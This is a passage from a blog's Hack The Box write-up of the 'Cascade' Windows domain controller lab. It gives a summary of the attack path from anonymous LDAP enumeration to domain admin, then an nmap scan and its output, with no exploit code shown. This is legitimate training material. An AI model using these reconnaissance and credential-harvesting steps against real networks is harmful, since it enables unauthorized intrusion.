<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">pL4StiC - </title>
<meta property="og:title" content=pL4StiC&#32;-&#32; />
<meta name="twitter:title" content=pL4StiC&#32;-&#32; />
<meta itemprop="name" content=pL4StiC&#32;-&#32; />
<meta name="application-name" content=pL4StiC&#32;-&#32; />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://pL4sTiC1337.github.io/images/htb---cascade/" />
<link rel="canonical" href="https://pL4sTiC1337.github.io/images/htb---cascade/" itemprop="url" />
<meta name="url" content="https://pL4sTiC1337.github.io/images/htb---cascade/" />
<meta name="twitter:url" content="https://pL4sTiC1337.github.io/images/htb---cascade/" />
<meta property="og:url" content="https://pL4sTiC1337.github.io/images/htb---cascade/" />


<meta property="og:updated_time" content="0001-01-01T00:00:00Z" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@pL4sTiC1337" />
    <meta name="twitter:creator" content="@pL4sTiC1337" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.143.1">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://pL4sTiC1337.github.io/">
                <img src="/images/pl4stic.png" alt="brand image">
            </a>
        
        
            <a href="https://pL4sTiC1337.github.io/">
                <h1>pL4StiC</h1>
            </a>
        
    </h1>
    <p class="lead">
    My Ramblings...
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
                
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
                            </li>
                        
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cascade/">HtB Cascade</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-giddy/">HtB Giddy</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-jab/">HtB Jab</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>





    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>





        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://pL4sTiC1337.github.io/images/htb---cascade/"></a>
  </h1>

  <div class="headline">
    <div>
      
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>10 mins read</span>
      </span>
    </div>

    
  </div>

  
  

  
</div>

  <p>![[Cascade.png]]</p>
<p>Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user <code>r.thompson</code>, which gives access to a <code>TightVNC</code> registry backup. The backup is decrypted to gain the password for <code>s.smith</code>. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the <code>ArkSvc</code> account. This account belongs to the <code>AD Recycle Bin</code> group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.</p>
<hr>
<h2 id="scanning">Scanning</h2>
<h3 id="nmap">nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.145.225
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| dns-nsid: 
</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-02-13 17:10:06Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49167/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose|phone|specialized
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2008|7|Vista|Phone|2012|8.1 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Embedded Standard <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
